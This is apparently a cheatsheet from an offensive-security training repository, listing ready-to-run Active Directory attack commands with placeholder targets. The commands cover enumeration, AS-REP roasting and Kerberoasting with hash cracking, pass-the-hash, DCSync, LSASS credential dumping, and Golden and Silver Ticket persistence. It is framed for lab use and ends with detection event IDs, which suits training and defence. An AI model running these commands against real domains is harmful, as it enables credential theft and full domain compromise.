<!-- SPDX-License-Identifier: GPL-3.0-or-later | Copyright (C) 2026 Nithees Narendra S -->
[Home](../README.md) › [Cheatsheets](README.md) › **Active Directory Attack Cheatsheet**

# Active Directory Attack Cheatsheet

> Enumeration, Kerberos attacks and lateral movement commands. Printable: use your browser's *Print → Save as PDF*.

_Domain: Offensive · Last updated 2026-08-13_

## Quick reference

This cheatsheet is a fast recall aid, not a tutorial — learn the concepts in the Manual, then keep this beside you while you work.

> Attack a lab forest (GOAD) you own. Map each step to MITRE ATT&CK.

## Enumeration
```bash
nxc smb DC_IP -u user -p pass --shares
nxc ldap DC_IP -u user -p pass --users --groups
bloodhound-python -u user -p pass -d domain.local -c All -ns DC_IP
kerbrute userenum -d domain.local --dc DC_IP users.txt
```

## Kerberos attacks
```bash
# AS-REP roasting (no pre-auth)
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC_IP
# Kerberoasting (SPN accounts)
impacket-GetUserSPNs -request -dc-ip DC_IP domain/user:pass
hashcat -m 18200 asrep.hash rockyou.txt      # AS-REP
hashcat -m 13100 spn.hash rockyou.txt        # TGS
```

## Credential access / movement
```bash
# Pass-the-hash
nxc smb TARGETS -u admin -H NTLM_HASH
impacket-psexec -hashes :NTLM_HASH admin@TARGET
# DCSync (dump krbtgt / any user)
impacket-secretsdump -just-dc domain/admin@DC_IP
# Dump LSASS creds (on host)
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```

## Persistence (lab)
- **Golden Ticket** — with krbtgt hash: `mimikatz kerberos::golden ...`
- **Silver Ticket** — with a service account hash, forge a service ticket.

## Detect
4768/4769 (roasting), 4728/4732 (group add), 4662 + replication from non-DC (DCSync).

## Related

- [All cheatsheets](README.md)
- [Tools reference](../reference/tools/README.md)
- [Repository home](../README.md)

